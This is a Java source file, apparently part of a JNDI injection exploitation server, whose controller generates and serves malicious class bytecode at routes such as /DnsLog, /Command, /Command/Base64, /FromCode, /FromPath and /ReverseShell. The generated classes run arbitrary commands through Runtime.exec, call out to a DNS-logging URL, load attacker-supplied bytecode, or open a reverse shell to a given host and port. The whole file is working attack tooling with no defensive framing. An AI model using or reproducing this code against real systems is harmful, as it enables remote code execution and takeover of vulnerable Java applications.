package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.server.WebServer;
import map.jndi.template.ReverseShellTemplate;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController implements Controller {
    public Object process(byte[] byteCode) {
        String className;

        try {
            ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
            className = classFile.getName();
        } catch (Exception e) {
            return null;
        }

        WebServer.serveFile("/" + className + ".class", byteCode);
        return className;
    }

    @JNDIMapping("/DnsLog/{url}")
    public byte[] dnsLog(String url) throws Exception {
        System.out.println("[DnsLog] Url:" + url);

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/Command/{cmd}")
    public byte[] command(String cmd) throws Exception {
        System.out.println("[Command] Cmd: " + cmd);

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", cmd);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/Command/Base64/{cmd}")
    public byte[] base64Command(String cmd) throws Exception {
        cmd = new String(Base64.getUrlDecoder().decode(cmd));
        return this.command(cmd);
    }

    @JNDIMapping("/FromCode/{code}")
    public byte[] fromCode(String code) {
        byte[] byteCode = Base64.getUrlDecoder().decode(code);
        return byteCode;
    }

    @JNDIMapping("/FromPath/{path}")
    public byte[] fromPath(String path) throws Exception {
        byte[] byteCode = Files.readAllBytes(Paths.get(path));
        return byteCode;
    }

    @JNDIMapping("/ReverseShell/{host}/{port}")
    public byte[] reverseShell(String host, String port) throws Exception {
        System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));

        return clazz.toBytecode();
    }
}